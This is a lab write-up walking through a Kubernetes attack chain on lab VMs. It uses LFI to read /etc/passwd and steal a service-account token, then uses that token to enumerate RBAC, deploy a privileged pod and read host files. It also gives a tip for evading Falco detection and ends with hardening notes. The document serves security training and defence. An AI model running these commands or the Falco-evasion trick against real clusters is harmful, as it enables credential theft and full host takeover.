# K8s-Guard: Attack Chain Walkthrough

Every command below runs from VM3 (Kali), in order.

**Full chain:** LFI → service-account token theft → API access → RBAC
enumeration → privileged pod → container escape → flag capture.

```
VM3 (Kali) ──curl──> VM2:30270 (LFI) ──token──> VM1:6443 (API) ──kubectl──> VM2 (Privileged Pod)
```

### Scenario
An internal penetration tester has network access (they're on the internal
network) but no Kubernetes credentials. They're testing what damage someone
with just network access could do, like a compromised employee laptop.

Targets:
- Webapp / LFI entry point: `192.168.50.11:30270` (VM2 worker)
- Kubernetes API server: `192.168.50.10:6443` (VM1 master)
- Attacker host: `192.168.50.20` (VM3 Kali)

---

## Phase 1: Reconnaissance & Discovery (run from Kali)

**Step 1.** Access the internal document portal.
```bash
curl http://192.168.50.11:30270/
```
Output: HTML page showing "Internal Document Portal v2.1" with links to files.

**Step 2.** Normal use: read a legitimate file.
```bash
curl http://192.168.50.11:30270/read?file=welcome.txt
```
Output: Welcome text. But the `?file=` parameter reads directly from disk.

**Step 3.** Test LFI with a system file.
```bash
curl "http://192.168.50.11:30270/read?file=/etc/passwd"
```
Output: System passwd file. Confirms the app reads ANY file without validation.

**Step 4.** Steal the Kubernetes service account token.
```bash
curl "http://192.168.50.11:30270/read?file=/var/run/secrets/kubernetes.io/serviceaccount/token"
```
Output: A long JWT token string. Every K8s pod has this at a well-known path.

**Step 5.** Save the token and scan for the API server.
```bash
TOKEN=$(curl -s "http://192.168.50.11:30270/read?file=/var/run/secrets/kubernetes.io/serviceaccount/token")
nmap -p 6443 192.168.50.0/24 --open
```
Output: 192.168.50.10 has port 6443 open (standard K8s API port).

**Step 6.** Test cluster access with the stolen token.
```bash
kubectl --server=https://192.168.50.10:6443 --token=$TOKEN --insecure-skip-tls-verify get nodes
```
Output: Both nodes listed as Ready. Token works.

**Step 7.** Enumerate RBAC bindings.
```bash
kubectl ... get clusterrolebindings
```
Output: Long list of system bindings. At the bottom: `vuln-sa-admin` bound to
`cluster-admin`. Suspicious.

**Step 8.** Inspect the binding.
```bash
kubectl ... get clusterrolebinding vuln-sa-admin -o yaml
```
Output shows:
- `roleRef.name: cluster-admin`, god mode permissions
- `subjects.name: vuln-sa`, the same service account whose token was stolen
- `kind: ClusterRoleBinding`, applies across the entire cluster, not just one namespace

> `kubectl ...` above is shorthand for the full flag set:
> `--server=https://192.168.50.10:6443 --token=$TOKEN --insecure-skip-tls-verify`

---

## Phase 2: Privilege Escalation (run from Kali)

**Step 1.** Examine the attack pod YAML (`~/Desktop/pwned.yaml`, see
[`pwned.yaml`](./pwned.yaml) in this folder).

What makes this dangerous:
- `privileged: true`, disables ALL container isolation
- `hostPID: true`, pod can see all host processes
- `hostNetwork: true`, pod shares the host's network
- `hostPath: /` at `/host`, entire host filesystem accessible
- `nodeName: worker`, forces the pod onto VM2 where the flag is

**Step 2.** Deploy the privileged pod.
```bash
kubectl ... apply -f ~/Desktop/pwned.yaml
```

**Step 3.** Read `/etc/shadow` inside the container (triggers Falco).
```bash
kubectl ... exec -it pwned -n vuln-app -- cat /etc/shadow
```
This is a natural attacker enumeration step, checking if you're root and what
accounts exist. Falco catches this.

**Step 4.** Capture the flag from the host filesystem.
```bash
kubectl ... exec -it pwned -n vuln-app -- cat /host/root/flag/proof.txt
```
Output: `FLAG{k8s_privilege_escalation_successful}`

Complete takeover: from a web bug to full host access in a few commands.

> Detection note (see `../detection/DETECTION.md`): `cat /etc/shadow` inside the
> container triggers Falco because it traverses the container's filesystem
> namespace. `cat /host/etc/shadow` via the hostPath mount does NOT trigger
> Falco. The mount is a direct passthrough to the host, bypassing the
> container namespace that Falco's eBPF probe watches.

---

## The Three Vulnerabilities This Chain Exploits

| # | Vulnerability | Role in the chain | If fixed |
|---|---|---|---|
| 1 | Local File Inclusion (LFI) | Reads the SA token from inside the pod | Attack stops at step 1 |
| 2 | RBAC over-permission (`vuln-sa` = `cluster-admin`) | Stolen token = full cluster control | Attack stops at step 4 |
| 3 | No Pod Security Standards | Lets attacker create a privileged pod / escape to host | Attack stops at step 5 |

> **LFI opens the door → RBAC gives the keys → No PSS lets the attacker walk
> out of the building.** Remove any one and the full attack chain breaks.
>
> The lab does **not** fix the LFI. That is an application code bug (a
> developer's job). The point is that proper Kubernetes controls (RBAC + PSS)
> limit the blast radius even while the app stays vulnerable. See
> `../hardening/HARDENING.md`.
